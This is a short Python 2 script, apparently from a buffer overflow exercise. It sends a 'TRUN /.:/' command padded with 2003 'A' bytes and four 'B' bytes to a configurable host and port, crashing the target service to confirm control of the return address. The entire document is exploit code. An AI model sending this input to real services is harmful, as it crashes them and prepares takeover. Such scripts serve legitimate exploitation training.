#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4

address = '127.0.0.1' #CHANGE THIS
port = 9999 #CHANGE THIS

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((address,port))

	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
